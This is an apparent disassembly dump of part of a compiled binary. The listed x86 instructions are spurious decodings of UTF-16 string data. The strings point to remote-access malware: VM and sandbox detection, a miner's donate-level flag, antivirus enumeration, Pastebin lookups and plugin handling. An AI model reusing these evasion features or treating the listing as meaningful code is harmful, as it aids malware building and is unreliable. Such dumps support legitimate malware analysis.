  40bed3:	00 72 00             	add    %dh,0x0(%edx)
  40bed6:	61                   	popa
  40bed7:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40bedb:	00 6f 00             	add    %ch,0x0(%edi)
  40bede:	6e                   	outsb  %ds:(%esi),(%dx)
  40bedf:	00 00                	add    %al,(%eax)
  40bee1:	0b 4d 00             	or     0x0(%ebp),%ecx
  40bee4:	6f                   	outsl  %ds:(%esi),(%dx)
  40bee5:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40bee9:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40beed:	0f 56 00             	orps   (%eax),%xmm0
  40bef0:	49                   	dec    %ecx
  40bef1:	00 52 00             	add    %dl,0x0(%edx)
  40bef4:	54                   	push   %esp
  40bef5:	00 55 00             	add    %dl,0x0(%ebp)
  40bef8:	41                   	inc    %ecx
  40bef9:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40befd:	0d 76 00 6d 00       	or     $0x6d0076,%eax
  40bf02:	77 00                	ja     0x40bf04
  40bf04:	61                   	popa
  40bf05:	00 72 00             	add    %dh,0x0(%edx)
  40bf08:	65 00 00             	add    %al,%gs:(%eax)
  40bf0b:	15 56 00 69 00       	adc    $0x690056,%eax
  40bf10:	72 00                	jb     0x40bf12
  40bf12:	74 00                	je     0x40bf14
  40bf14:	75 00                	jne    0x40bf16
  40bf16:	61                   	popa
  40bf17:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  40bf1b:	00 6f 00             	add    %ch,0x0(%edi)
  40bf1e:	78 00                	js     0x40bf20
  40bf20:	00 17                	add    %dl,(%edi)
  40bf22:	53                   	push   %ebx
  40bf23:	00 62 00             	add    %ah,0x0(%edx)
  40bf26:	69 00 65 00 44 00    	imul   $0x440065,(%eax),%eax
  40bf2c:	6c                   	insb   (%dx),%es:(%edi)
  40bf2d:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40bf31:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  40bf35:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40bf39:	1f                   	pop    %ds
  40bf3a:	2d 00 2d 00 64       	sub    $0x64002d00,%eax
  40bf3f:	00 6f 00             	add    %ch,0x0(%edi)
  40bf42:	6e                   	outsb  %ds:(%esi),(%dx)
  40bf43:	00 61 00             	add    %ah,0x0(%ecx)
  40bf46:	74 00                	je     0x40bf48
  40bf48:	65 00 2d 00 6c 00 65 	add    %ch,%gs:0x65006c00
  40bf4f:	00 76 00             	add    %dh,0x0(%esi)
  40bf52:	65 00 6c 00 3d       	add    %ch,%gs:0x3d(%eax,%eax,1)
  40bf57:	00 01                	add    %al,(%ecx)
  40bf59:	03 31                	add    (%ecx),%esi
  40bf5b:	00 00                	add    %al,(%eax)
  40bf5d:	71 53                	jno    0x40bfb2
  40bf5f:	00 45 00             	add    %al,0x0(%ebp)
  40bf62:	4c                   	dec    %esp
  40bf63:	00 45 00             	add    %al,0x0(%ebp)
  40bf66:	43                   	inc    %ebx
  40bf67:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  40bf6b:	00 43 00             	add    %al,0x0(%ebx)
  40bf6e:	6f                   	outsl  %ds:(%esi),(%dx)
  40bf6f:	00 6d 00             	add    %ch,0x0(%ebp)
  40bf72:	6d                   	insl   (%dx),%es:(%edi)
  40bf73:	00 61 00             	add    %ah,0x0(%ecx)
  40bf76:	6e                   	outsb  %ds:(%esi),(%dx)
  40bf77:	00 64 00 4c          	add    %ah,0x4c(%eax,%eax,1)
  40bf7b:	00 69 00             	add    %ch,0x0(%ecx)
  40bf7e:	6e                   	outsb  %ds:(%esi),(%dx)
  40bf7f:	00 65 00             	add    %ah,0x0(%ebp)
  40bf82:	20 00                	and    %al,(%eax)
  40bf84:	46                   	inc    %esi
  40bf85:	00 52 00             	add    %dl,0x0(%edx)
  40bf88:	4f                   	dec    %edi
  40bf89:	00 4d 00             	add    %cl,0x0(%ebp)
  40bf8c:	20 00                	and    %al,(%eax)
  40bf8e:	57                   	push   %edi
  40bf8f:	00 69 00             	add    %ch,0x0(%ecx)
  40bf92:	6e                   	outsb  %ds:(%esi),(%dx)
  40bf93:	00 33                	add    %dh,(%ebx)
  40bf95:	00 32                	add    %dh,(%edx)
  40bf97:	00 5f 00             	add    %bl,0x0(%edi)
  40bf9a:	50                   	push   %eax
  40bf9b:	00 72 00             	add    %dh,0x0(%edx)
  40bf9e:	6f                   	outsl  %ds:(%esi),(%dx)
  40bf9f:	00 63 00             	add    %ah,0x0(%ebx)
  40bfa2:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40bfa6:	73 00                	jae    0x40bfa8
  40bfa8:	20 00                	and    %al,(%eax)
  40bfaa:	57                   	push   %edi
  40bfab:	00 48 00             	add    %cl,0x0(%eax)
  40bfae:	45                   	inc    %ebp
  40bfaf:	00 52 00             	add    %dl,0x0(%edx)
  40bfb2:	45                   	inc    %ebp
  40bfb3:	00 20                	add    %ah,(%eax)
  40bfb5:	00 50 00             	add    %dl,0x0(%eax)
  40bfb8:	72 00                	jb     0x40bfba
  40bfba:	6f                   	outsl  %ds:(%esi),(%dx)
  40bfbb:	00 63 00             	add    %ah,0x0(%ebx)
  40bfbe:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40bfc2:	73 00                	jae    0x40bfc4
  40bfc4:	49                   	dec    %ecx
  40bfc5:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40bfc9:	00 3d 00 20 00 00    	add    %bh,0x2000
  40bfcf:	17                   	pop    %ss
  40bfd0:	43                   	inc    %ebx
  40bfd1:	00 6f 00             	add    %ch,0x0(%edi)
  40bfd4:	6d                   	insl   (%dx),%es:(%edi)
  40bfd5:	00 6d 00             	add    %ch,0x0(%ebp)
  40bfd8:	61                   	popa
  40bfd9:	00 6e 00             	add    %ch,0x0(%esi)
  40bfdc:	64 00 4c 00 69       	add    %cl,%fs:0x69(%eax,%eax,1)
  40bfe1:	00 6e 00             	add    %ch,0x0(%esi)
  40bfe4:	65 00 00             	add    %al,%gs:(%eax)
  40bfe7:	11 45 00             	adc    %eax,0x0(%ebp)
  40bfea:	72 00                	jb     0x40bfec
  40bfec:	72 00                	jb     0x40bfee
  40bfee:	20 00                	and    %al,(%eax)
  40bff0:	48                   	dec    %eax
  40bff1:	00 57 00             	add    %dl,0x0(%edi)
  40bff4:	49                   	dec    %ecx
  40bff5:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40bff9:	05 78 00 32 00       	add    $0x320078,%eax
  40bffe:	00 15 43 00 6c 00    	add    %dl,0x6c0043
  40c004:	69 00 65 00 6e 00    	imul   $0x6e0065,(%eax),%eax
  40c00a:	74 00                	je     0x40c00c
  40c00c:	49                   	dec    %ecx
  40c00d:	00 6e 00             	add    %ch,0x0(%esi)
  40c010:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40c014:	00 09                	add    %cl,(%ecx)
  40c016:	48                   	dec    %eax
  40c017:	00 57 00             	add    %dl,0x0(%edi)
  40c01a:	49                   	dec    %ecx
  40c01b:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40c01f:	09 55 00             	or     %edx,0x0(%ebp)
  40c022:	73 00                	jae    0x40c024
  40c024:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c028:	00 05 4f 00 53 00    	add    %al,0x53004f
  40c02e:	00 13                	add    %dl,(%ebx)
  40c030:	4d                   	dec    %ebp
  40c031:	00 69 00             	add    %ch,0x0(%ecx)
  40c034:	63 00                	arpl   %eax,(%eax)
  40c036:	72 00                	jb     0x40c038
  40c038:	6f                   	outsl  %ds:(%esi),(%dx)
  40c039:	00 73 00             	add    %dh,0x0(%ebx)
  40c03c:	6f                   	outsl  %ds:(%esi),(%dx)
  40c03d:	00 66 00             	add    %ah,0x0(%esi)
  40c040:	74 00                	je     0x40c042
  40c042:	00 03                	add    %al,(%ebx)
  40c044:	20 00                	and    %al,(%eax)
  40c046:	00 09                	add    %cl,(%ecx)
  40c048:	54                   	push   %esp
  40c049:	00 72 00             	add    %dh,0x0(%edx)
  40c04c:	75 00                	jne    0x40c04e
  40c04e:	65 00 00             	add    %al,%gs:(%eax)
  40c051:	0b 36                	or     (%esi),%esi
  40c053:	00 34 00             	add    %dh,(%eax,%eax,1)
  40c056:	62 00                	bound  %eax,(%eax)
  40c058:	69 00 74 00 00 0b    	imul   $0xb000074,(%eax),%eax
  40c05e:	46                   	inc    %esi
  40c05f:	00 61 00             	add    %ah,0x0(%ecx)
  40c062:	6c                   	insb   (%dx),%es:(%edi)
  40c063:	00 73 00             	add    %dh,0x0(%ebx)
  40c066:	65 00 00             	add    %al,%gs:(%eax)
  40c069:	0b 33                	or     (%ebx),%esi
  40c06b:	00 32                	add    %dh,(%edx)
  40c06d:	00 62 00             	add    %ah,0x0(%edx)
  40c070:	69 00 74 00 00 09    	imul   $0x9000074,(%eax),%eax
  40c076:	50                   	push   %eax
  40c077:	00 61 00             	add    %ah,0x0(%ecx)
  40c07a:	74 00                	je     0x40c07c
  40c07c:	68 00 00 0f 56       	push   $0x560f0000
  40c081:	00 65 00             	add    %ah,0x0(%ebp)
  40c084:	72 00                	jb     0x40c086
  40c086:	73 00                	jae    0x40c088
  40c088:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40c08e:	00 0b                	add    %cl,(%ebx)
  40c090:	41                   	inc    %ecx
  40c091:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  40c095:	00 69 00             	add    %ch,0x0(%ecx)
  40c098:	6e                   	outsb  %ds:(%esi),(%dx)
  40c099:	00 00                	add    %al,(%eax)
  40c09b:	09 74 00 72          	or     %esi,0x72(%eax,%eax,1)
  40c09f:	00 75 00             	add    %dh,0x0(%ebp)
  40c0a2:	65 00 00             	add    %al,%gs:(%eax)
  40c0a5:	0b 66 00             	or     0x0(%esi),%esp
  40c0a8:	61                   	popa
  40c0a9:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  40c0ad:	00 65 00             	add    %ah,0x0(%ebp)
  40c0b0:	00 17                	add    %dl,(%edi)
  40c0b2:	50                   	push   %eax
  40c0b3:	00 65 00             	add    %ah,0x0(%ebp)
  40c0b6:	72 00                	jb     0x40c0b8
  40c0b8:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40c0bc:	72 00                	jb     0x40c0be
  40c0be:	6d                   	insl   (%dx),%es:(%edi)
  40c0bf:	00 61 00             	add    %ah,0x0(%ecx)
  40c0c2:	6e                   	outsb  %ds:(%esi),(%dx)
  40c0c3:	00 63 00             	add    %ah,0x0(%ebx)
  40c0c6:	65 00 00             	add    %al,%gs:(%eax)
  40c0c9:	11 50 00             	adc    %edx,0x0(%eax)
  40c0cc:	61                   	popa
  40c0cd:	00 73 00             	add    %dh,0x0(%ebx)
  40c0d0:	74 00                	je     0x40c0d2
  40c0d2:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  40c0d6:	69 00 6e 00 00 13    	imul   $0x1300006e,(%eax),%eax
  40c0dc:	41                   	inc    %ecx
  40c0dd:	00 6e 00             	add    %ch,0x0(%esi)
  40c0e0:	74 00                	je     0x40c0e2
  40c0e2:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40c0e8:	72 00                	jb     0x40c0ea
  40c0ea:	75 00                	jne    0x40c0ec
  40c0ec:	73 00                	jae    0x40c0ee
  40c0ee:	00 13                	add    %dl,(%ebx)
  40c0f0:	49                   	dec    %ecx
  40c0f1:	00 6e 00             	add    %ch,0x0(%esi)
  40c0f4:	73 00                	jae    0x40c0f6
  40c0f6:	74 00                	je     0x40c0f8
  40c0f8:	61                   	popa
  40c0f9:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40c0fd:	00 65 00             	add    %ah,0x0(%ebp)
  40c100:	64 00 00             	add    %al,%fs:(%eax)
  40c103:	09 50 00             	or     %edx,0x0(%eax)
  40c106:	6f                   	outsl  %ds:(%esi),(%dx)
  40c107:	00 6e 00             	add    %ch,0x0(%esi)
  40c10a:	67 00 00             	add    %al,(%bx,%si)
  40c10d:	05 5c 00 5c 00       	add    $0x5c005c,%eax
  40c112:	00 2b                	add    %ch,(%ebx)
  40c114:	5c                   	pop    %esp
  40c115:	00 72 00             	add    %dh,0x0(%edx)
  40c118:	6f                   	outsl  %ds:(%esi),(%dx)
  40c119:	00 6f 00             	add    %ch,0x0(%edi)
  40c11c:	74 00                	je     0x40c11e
  40c11e:	5c                   	pop    %esp
  40c11f:	00 53 00             	add    %dl,0x0(%ebx)
  40c122:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40c126:	75 00                	jne    0x40c128
  40c128:	72 00                	jb     0x40c12a
  40c12a:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  40c130:	43                   	inc    %ebx
  40c131:	00 65 00             	add    %ah,0x0(%ebp)
  40c134:	6e                   	outsb  %ds:(%esi),(%dx)
  40c135:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40c139:	00 72 00             	add    %dh,0x0(%edx)
  40c13c:	32 00                	xor    (%eax),%al
  40c13e:	00 3d 53 00 65 00    	add    %bh,0x650053
  40c144:	6c                   	insb   (%dx),%es:(%edi)
  40c145:	00 65 00             	add    %ah,0x0(%ebp)
  40c148:	63 00                	arpl   %eax,(%eax)
  40c14a:	74 00                	je     0x40c14c
  40c14c:	20 00                	and    %al,(%eax)
  40c14e:	2a 00                	sub    (%eax),%al
  40c150:	20 00                	and    %al,(%eax)
  40c152:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40c156:	6f                   	outsl  %ds:(%esi),(%dx)
  40c157:	00 6d 00             	add    %ch,0x0(%ebp)
  40c15a:	20 00                	and    %al,(%eax)
  40c15c:	41                   	inc    %ecx
  40c15d:	00 6e 00             	add    %ch,0x0(%esi)
  40c160:	74 00                	je     0x40c162
  40c162:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40c168:	72 00                	jb     0x40c16a
  40c16a:	75 00                	jne    0x40c16c
  40c16c:	73 00                	jae    0x40c16e
  40c16e:	50                   	push   %eax
  40c16f:	00 72 00             	add    %dh,0x0(%edx)
  40c172:	6f                   	outsl  %ds:(%esi),(%dx)
  40c173:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  40c177:	00 63 00             	add    %ah,0x0(%ebx)
  40c17a:	74 00                	je     0x40c17c
  40c17c:	00 17                	add    %dl,(%edi)
  40c17e:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40c182:	73 00                	jae    0x40c184
  40c184:	70 00                	jo     0x40c186
  40c186:	6c                   	insb   (%dx),%es:(%edi)
  40c187:	00 61 00             	add    %ah,0x0(%ecx)
  40c18a:	79 00                	jns    0x40c18c
  40c18c:	4e                   	dec    %esi
  40c18d:	00 61 00             	add    %ah,0x0(%ecx)
  40c190:	6d                   	insl   (%dx),%es:(%edi)
  40c191:	00 65 00             	add    %ah,0x0(%ebp)
  40c194:	00 07                	add    %al,(%edi)
  40c196:	4e                   	dec    %esi
  40c197:	00 2f                	add    %ch,(%edi)
  40c199:	00 41 00             	add    %al,0x0(%ecx)
  40c19c:	00 05 2c 00 20 00    	add    %al,0x20002c
  40c1a2:	00 13                	add    %dl,(%ebx)
  40c1a4:	53                   	push   %ebx
  40c1a5:	00 6f 00             	add    %ch,0x0(%edi)
  40c1a8:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  40c1ad:	00 61 00             	add    %ah,0x0(%ecx)
  40c1b0:	72 00                	jb     0x40c1b2
  40c1b2:	65 00 5c 00 00       	add    %bl,%gs:0x0(%eax,%eax,1)
  40c1b7:	09 70 00             	or     %esi,0x0(%eax)
  40c1ba:	6f                   	outsl  %ds:(%esi),(%dx)
  40c1bb:	00 6e 00             	add    %ch,0x0(%esi)
  40c1be:	67 00 00             	add    %al,(%bx,%si)
  40c1c1:	0d 70 00 6c 00       	or     $0x6c0070,%eax
  40c1c6:	75 00                	jne    0x40c1c8
  40c1c8:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40c1cc:	6e                   	outsb  %ds:(%esi),(%dx)
  40c1cd:	00 00                	add    %al,(%eax)
  40c1cf:	15 73 00 61 00       	adc    $0x610073,%eax
  40c1d4:	76 00                	jbe    0x40c1d6
  40c1d6:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40c1da:	6c                   	insb   (%dx),%es:(%edi)
  40c1db:	00 75 00             	add    %dh,0x0(%ebp)
  40c1de:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40c1e2:	6e                   	outsb  %ds:(%esi),(%dx)
  40c1e3:	00 00                	add    %al,(%eax)
  40c1e5:	07                   	pop    %es
  40c1e6:	44                   	inc    %esp
  40c1e7:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40c1eb:	00 00                	add    %al,(%eax)
  40c1ed:	15 73 00 65 00       	adc    $0x650073,%eax
  40c1f2:	6e                   	outsb  %ds:(%esi),(%dx)
  40c1f3:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  40c1f7:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40c1fb:	00 67 00             	add    %ah,0x0(%edi)
  40c1fe:	69 00 6e 00 00 0d    	imul   $0xd00006e,(%eax),%eax
  40c204:	48                   	dec    %eax
  40c205:	00 61 00             	add    %ah,0x0(%ecx)
  40c208:	73 00                	jae    0x40c20a
  40c20a:	68 00 65 00 73       	push   $0x73006500
  40c20f:	00 00                	add    %al,(%eax)
  40c211:	09 48 00             	or     %ecx,0x0(%eax)
  40c214:	61                   	popa
  40c215:	00 73 00             	add    %dh,0x0(%ebx)
  40c218:	68 00 00 1b 50       	push   $0x501b0000
  40c21d:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40c221:	00 67 00             	add    %ah,0x0(%edi)
  40c224:	69 00 6e 00 2e 00    	imul   $0x2e006e,(%eax),%eax
  40c22a:	50                   	push   %eax
  40c22b:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40c22f:	00 67 00             	add    %ah,0x0(%edi)
  40c232:	69 00 6e 00 00 07    	imul   $0x700006e,(%eax),%eax
  40c238:	52                   	push   %edx
  40c239:	00 75 00             	add    %dh,0x0(%ebp)
  40c23c:	6e                   	outsb  %ds:(%esi),(%dx)
  40c23d:	00 00                	add    %al,(%eax)
  40c23f:	0f 4d 00             	cmovge (%eax),%eax
  40c242:	73 00                	jae    0x40c244
  40c244:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  40c248:	61                   	popa
  40c249:	00 63 00             	add    %ah,0x0(%ebx)
  40c24c:	6b 00 00             	imul   $0x0,(%eax),%eax
  40c24f:	11 52 00             	adc    %edx,0x0(%edx)
  40c252:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40c256:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40c25a:	76 00                	jbe    0x40c25c
  40c25c:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  40c261:	0b 45 00             	or     0x0(%ebp),%eax
  40c264:	72 00                	jb     0x40c266
  40c266:	72 00                	jb     0x40c268
  40c268:	6f                   	outsl  %ds:(%esi),(%dx)
  40c269:	00 72 00             	add    %dh,0x0(%edx)
  40c26c:	00 47 6d             	add    %al,0x6d(%edi)
  40c26f:	00 61 00             	add    %ah,0x0(%ecx)
  40c272:	73 00                	jae    0x40c274
  40c274:	74 00                	je     0x40c276
  40c276:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c27a:	4b                   	dec    %ebx
  40c27b:	00 65 00             	add    %ah,0x0(%ebp)
  40c27e:	79 00                	jns    0x40c280
  40c280:	20 00                	and    %al,(%eax)
  40c282:	63 00                	arpl   %eax,(%eax)
  40c284:	61                   	popa
  40c285:	00 6e 00             	add    %ch,0x0(%esi)
  40c288:	20 00                	and    %al,(%eax)
  40c28a:	6e                   	outsb  %ds:(%esi),(%dx)
  40c28b:	00 6f 00             	add    %ch,0x0(%edi)
  40c28e:	74 00                	je     0x40c290
  40c290:	20 00                	and    %al,(%eax)
  40c292:	62 00                	bound  %eax,(%eax)
  40c294:	65 00 20             	add    %ah,%gs:(%eax)
  40c297:	00 6e 00             	add    %ch,0x0(%esi)
  40c29a:	75 00                	jne    0x40c29c
  40c29c:	6c                   	insb   (%dx),%es:(%edi)
  40c29d:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  40c2a1:	00 6f 00             	add    %ch,0x0(%edi)
  40c2a4:	72 00                	jb     0x40c2a6
  40c2a6:	20 00                	and    %al,(%eax)
  40c2a8:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40c2ac:	70 00                	jo     0x40c2ae
  40c2ae:	74 00                	je     0x40c2b0
  40c2b0:	79 00                	jns    0x40c2b2
  40c2b2:	2e 00 00             	add    %al,%cs:(%eax)
  40c2b5:	2d 69 00 6e 00       	sub    $0x6e0069,%eax
  40c2ba:	70 00                	jo     0x40c2bc
  40c2bc:	75 00                	jne    0x40c2be
  40c2be:	74 00                	je     0x40c2c0
  40c2c0:	20 00                	and    %al,(%eax)
  40c2c2:	63 00                	arpl   %eax,(%eax)
  40c2c4:	61                   	popa
  40c2c5:	00 6e 00             	add    %ch,0x0(%esi)
  40c2c8:	20 00                	and    %al,(%eax)
  40c2ca:	6e                   	outsb  %ds:(%esi),(%dx)
  40c2cb:	00 6f 00             	add    %ch,0x0(%edi)
  40c2ce:	74 00                	je     0x40c2d0
  40c2d0:	20 00                	and    %al,(%eax)
  40c2d2:	62 00                	bound  %eax,(%eax)
  40c2d4:	65 00 20             	add    %ah,%gs:(%eax)
  40c2d7:	00 6e 00             	add    %ch,0x0(%esi)
  40c2da:	75 00                	jne    0x40c2dc
  40c2dc:	6c                   	insb   (%dx),%es:(%edi)
  40c2dd:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40c2e1:	00 00                	add    %al,(%eax)
  40c2e3:	55                   	push   %ebp
  40c2e4:	49                   	dec    %ecx
  40c2e5:	00 6e 00             	add    %ch,0x0(%esi)
  40c2e8:	76 00                	jbe    0x40c2ea
  40c2ea:	61                   	popa
  40c2eb:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40c2ef:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40c2f3:	00 6d 00             	add    %ch,0x0(%ebp)
  40c2f6:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40c2fa:	73 00                	jae    0x40c2fc
  40c2fc:	61                   	popa
  40c2fd:	00 67 00             	add    %ah,0x0(%edi)
  40c300:	65 00 20             	add    %ah,%gs:(%eax)
  40c303:	00 61 00             	add    %ah,0x0(%ecx)
  40c306:	75 00                	jne    0x40c308
  40c308:	74 00                	je     0x40c30a
  40c30a:	68 00 65 00 6e       	push   $0x6e006500
  40c30f:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40c313:	00 63 00             	add    %ah,0x0(%ebx)
  40c316:	61                   	popa
  40c317:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40c31b:	00 6f 00             	add    %ch,0x0(%edi)
  40c31e:	6e                   	outsb  %ds:(%esi),(%dx)
  40c31f:	00 20                	add    %ah,(%eax)
  40c321:	00 63 00             	add    %ah,0x0(%ebx)
  40c324:	6f                   	outsl  %ds:(%esi),(%dx)
  40c325:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40c329:	00 20                	add    %ah,(%eax)
  40c32b:	00 28                	add    %ch,(%eax)
  40c32d:	00 4d 00             	add    %cl,0x0(%ebp)
  40c330:	41                   	inc    %ecx
  40c331:	00 43 00             	add    %al,0x0(%ebx)
  40c334:	29 00                	sub    %eax,(%eax)
  40c336:	2e 00 00             	add    %al,%cs:(%eax)
  40c339:	05 58 00 32 00       	add    $0x320058,%eax
  40c33e:	00 00                	add    %al,(%eax)
  40c340:	36 9d                	ss popf
  40c342:	ff a4 36 e0 75 45 af 	jmp    *-0x50ba8a20(%esi,%esi,1)
  40c349:	eb 5b                	jmp    0x40c3a6
  40c34b:	54                   	push   %esp
  40c34c:	8a a7 3f 24 00 08    	mov    0x800243f(%edi),%ah
  40c352:	b7 7a                	mov    $0x7a,%bh
  40c354:	5c                   	pop    %esp
  40c355:	56                   	push   %esi
  40c356:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  40c359:	89 03                	mov    %eax,(%ebx)
  40c35b:	00 00                	add    %al,(%eax)
  40c35d:	01 03                	add    %eax,(%ebx)
  40c35f:	20 00                	and    %al,(%eax)
  40c361:	01 02                	add    %eax,(%edx)
  40c363:	06                   	push   %es
  40c364:	0e                   	push   %cs
  40c365:	03 06                	add    (%esi),%eax
  40c367:	12 09                	adc    (%ecx),%cl
  40c369:	03 06                	add    (%esi),%eax
  40c36b:	12 60 03             	adc    0x3(%eax),%ah
  40c36e:	00 00                	add    %al,(%eax)
  40c370:	02 03                	add    (%ebx),%al
  40c372:	06                   	push   %es
  40c373:	12 0d 03 06 12 11    	adc    0x11120603,%cl
  40c379:	03 06                	add    (%esi),%eax
  40c37b:	1d 05 02 06 0a       	sbb    $0xa060205,%eax
  40c380:	03 06                	add    (%esi),%eax
  40c382:	12 15 02 06 02 02    	adc    0x2020602,%dl
  40c388:	06                   	push   %es
  40c389:	1c 02                	sbb    $0x2,%al
  40c38b:	06                   	push   %es
  40c38c:	08 04 00             	or     %al,(%eax,%eax,1)
  40c38f:	00 12                	add    %dl,(%edx)
  40c391:	0d 05 00 01 01       	or     $0x1010005,%eax
  40c396:	12 0d 04 00 00 12    	adc    0x12000004,%cl
  40c39c:	11 05 00 01 01 12    	adc    %eax,0x12010100
  40c3a2:	11 04 00             	adc    %eax,(%eax,%eax,1)
  40c3a5:	00 1d 05 05 00 01    	add    %bl,0x1000505
  40c3ab:	01 1d 05 03 00 00    	add    %ebx,0x305
  40c3b1:	0a 04 00             	or     (%eax,%eax,1),%al
  40c3b4:	01 01                	add    %eax,(%ecx)
  40c3b6:	0a 04 00             	or     (%eax,%eax,1),%al
  40c3b9:	00 12                	add    %dl,(%edx)
  40c3bb:	15 05 00 01 01       	adc    $0x1010005,%eax
  40c3c0:	12 15 04 00 01 01    	adc    0x1010004,%dl
  40c3c6:	02 03                	add    (%ebx),%al
  40c3c8:	00 00                	add    %al,(%eax)
  40c3ca:	1c 03                	sbb    $0x3,%al
  40c3cc:	00 00                	add    %al,(%eax)
  40c3ce:	08 04 00             	or     %al,(%eax,%eax,1)
  40c3d1:	01 01                	add    %eax,(%ecx)
  40c3d3:	08 04 00             	or     %al,(%eax,%eax,1)
  40c3d6:	01 02                	add    %eax,(%edx)
  40c3d8:	0e                   	push   %cs
  40c3d9:	0a 00                	or     (%eax),%al
  40c3db:	04 02                	add    $0x2,%al
  40c3dd:	1c 12                	sbb    $0x12,%al
  40c3df:	19 12                	sbb    %edx,(%edx)
  40c3e1:	1d 11 21 05 00       	sbb    $0x52111,%eax
  40c3e6:	01 01                	add    %eax,(%ecx)
  40c3e8:	12 25 04 00 01 01    	adc    0x1010004,%ah
  40c3ee:	1c 04                	sbb    $0x4,%al
  40c3f0:	08 00                	or     %al,(%eax)
  40c3f2:	12 0d 04 08 00 12    	adc    0x12000804,%cl
  40c3f8:	11 04 08             	adc    %eax,(%eax,%ecx,1)
  40c3fb:	00 1d 05 03 08 00    	add    %bl,0x80305
  40c401:	0a 04 08             	or     (%eax,%ecx,1),%al
  40c404:	00 12                	add    %dl,(%edx)
  40c406:	15 03 08 00 02       	adc    $0x2000803,%eax
  40c40b:	03 08                	add    (%eax),%ecx
  40c40d:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40c410:	08 00                	or     %al,(%eax)
  40c412:	08 03                	or     %al,(%ebx)
  40c414:	06                   	push   %es
  40c415:	12 29                	adc    (%ecx),%ch
  40c417:	05 00 01 1d 05       	add    $0x51d0100,%eax
  40c41c:	0e                   	push   %cs
  40c41d:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  40c422:	05 06 00 01 1d       	add    $0x1d010006,%eax
  40c427:	05 1d 05 05 00       	add    $0x5051d,%eax
  40c42c:	01 1d 05 0a 05 00    	add    %ebx,0x50a05
  40c432:	01 1d 05 08 05 00    	add    %ebx,0x50805
  40c438:	01 1d 05 06 05 00    	add    %ebx,0x50605
  40c43e:	01 1d 05 0d 07 06    	add    %ebx,0x6070d05
  40c444:	15 12 31 01 12       	adc    $0x12013112,%eax
  40c449:	20 09                	and    %cl,(%ecx)
  40c44b:	20 01                	and    %al,(%ecx)
  40c44d:	01 15 12 31 01 12    	add    %edx,0x12013112
  40c453:	20 03                	and    %al,(%ebx)
  40c455:	20 00                	and    %al,(%eax)
  40c457:	1c 03                	sbb    $0x3,%al
  40c459:	20 00                	and    %al,(%eax)
  40c45b:	02 03                	add    (%ebx),%al
  40c45d:	28 00                	sub    %al,(%eax)
  40c45f:	1c 03                	sbb    $0x3,%al
  40c461:	06                   	push   %es
  40c462:	12 20                	adc    (%eax),%ah
  40c464:	0b 20                	or     (%eax),%esp
  40c466:	02 01                	add    (%ecx),%al
  40c468:	12 20                	adc    (%eax),%ah
  40c46a:	15 12 31 01 12       	adc    $0x12013112,%eax
  40c46f:	20 04 20             	and    %al,(%eax,%eiz,1)
  40c472:	00 12                	add    %dl,(%edx)
  40c474:	20 05 20 01 12 20    	and    %al,0x20120120
  40c47a:	0e                   	push   %cs
  40c47b:	05 20 01 12 20       	add    $0x20120120,%eax
  40c480:	0a 05 20 01 12 20    	or     0x20120120,%al
  40c486:	0d 05 20 01 12       	or     $0x12012005,%eax
  40c48b:	20 08                	and    %cl,(%eax)
  40c48d:	03 20                	add    (%eax),%esp
